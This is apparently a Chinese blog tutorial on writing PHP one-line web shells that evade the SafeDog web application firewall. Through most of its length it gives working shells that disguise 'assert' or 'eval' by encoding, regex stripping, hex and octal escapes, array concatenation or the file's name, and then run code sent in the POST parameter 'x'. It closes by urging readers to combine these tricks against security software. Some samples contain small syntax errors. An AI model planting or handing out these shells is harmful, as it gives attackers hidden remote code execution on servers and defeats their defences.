前言

本文的一切测试皆在以下版本中进行，同时，只描述PHP过狗的情况：



目前一句话进行过狗的方式主要有以下几种：

  • 关键词变形

  • 回调函数

  • 无关键词


脚本要将字符串(或文件流)当作 PHP 代码执行，目前主要会使用以下函数：

  • eval : PHP 4, PHP 5, PHP 7+ 均可用，接受一个参数，将字符串作为 PHP 代码执行

  • assert : PHP 4, PHP 5, PHP 7.2 以下均可用，一般接受一个参数，php 5.4.8 版本后可以接受两个参数

  • 正则匹配类 : preg_replace/mb_ereg_replace/preg_filter 等

  • 文件包含类 : include/include_once/require/require_once/file_get_contents 等


常见的字符串处理方式：

  • 编码解码

  • 字符串替换

  • 进制转换

  • 运算

  • 打散拼接

  • …


实施

我们按照上面说的几种过狗方式，一一编写过狗的一句话。当然不推荐只采用一种方式进行过狗，原因如下：

  • 只采用一种方式的话，代码可能会很长，而且看起来会很怪异，所以人工查验的话会很明显；

  • 现在网马库越来越全，只用一种方式，研究的时间成本可能会很高。



关键词变形

关键词变形中的这个关键词不只是eval、assert这些，也包含一些字符处理函数。关键词变形是目前最常用到也是姿势最多的一种过WAF的方式，我们按照上面提到的几种方式来一一编写示例。



编码解码

常见编码的函数有 base64_decode、str_rot13、url_decode 之类，如果纯用编码的方式进行过狗的话，比较困难，我没有找到纯编码解码的示例，而是结合了其他的方式。


<?
phpfunction foo($xxx){    
  $x1 = "";    
  $arr = array("GLk", "Gpm", "Gpm", "GL1", "Gpl", "Gp0");  
  foreach ($arr as $value){        $x1 = $x1."W".$value;   
  }   
  $y1 = urldecode(base64_decode(str_rot13($x1)));   
  @$y1($xxx);}foo($_POST["x"]);


?>


这个例子将编码后的字符串通过数组打散，然后遍历拼接出了 assert ，最后执行用户传过来的代码。



字符串替换

字符串替换同样是一个用到烂的方式，但是竟然还好用，示例如下。


<?
phpfunction foo($xxx){   
  $x = "a/*adaw*/s/a3sdfsd==/se/wdasdawd/r/+asdadsada+/t";   
  $x = preg_replace("/\/.*?\//", "", $x);    @$x($xxx);}foo($_POST["x"]);
?>

上面的示例是用正则将 // 内的内容替换为空，替换后就是 assert 了。




进制转换

下面的例子结合使用了十六进制和八进制，将assert隐藏了起来。


<?php
  $x="\x61";
  $x .= "\163";
  $x .= "\x73";
  $x .= "\145";
  $x .= "\x72";
  $x .= "\164";
  @$x($_POST["x"]);
?>

打散拼接

在这个示例中，我们利用数组把 assert 打散后重新再进行组合，然后执行用户 POST 过来的代码。


<?php
$arr = array("as" => "foo", "se" => "bar", "r" => ".");
$x = $_POST["x"];
$arr2 = array_keys($arr);
$y = $arr2[0].$arr2[1].$arr2[2]."t";@$y($x);
?>

在第二个示例中，我们对 str_rot13 进行了变形， nffreg 就是 rot13 编码后的 assert .解码后执行用户 POST 过来的代码，当然这个示例也对 assert 进行了变形。


<?php
function foo($user){   
   $b='s'.'tr_r'.'ot13';   
   $c=$b;    $a=$c('nffreg');    
   $a($user);}foo($_POST['x]);
?>

无关键词

无关键词的情况，我总结有两种方式，分开说下。


用户传入关键词

用户传入关键词这种情况，没有什么要说的，不好用。传入方式除了和代码一块使用 POST 传入，也可用 header 中的参数传入，例如 UA 之类，代码本身天生过狗，但是还是…不好用，不推荐使用。


从其他地方获取关键词

从其他地方获取关键词就看脑洞了。提供一种思路是从文件名获取到 eval 。代码如下：


<?php 
($x = $_POST['x']) && @preg_replace('/ad/e','@'.substr($_SERVER["PHP_SELF"],-8,4).'($x)','add');
?>


这种方式在代码中完全没有出现过 eval 这个关键词，而是取用了文件名的后四位（不包含后缀名）来执行代码。当然这种方式是有限制的，这个文件的文件名，后四位必须是 eval ，例如 xxxxxxeval.php 。


总结

一句话过狗是所有过狗操作中最为简单的一部分，上面给出的代码大多只是使用了一种方式，灵活结合这些方式将能够更加轻松地绕过安全狗或其他安全软件。
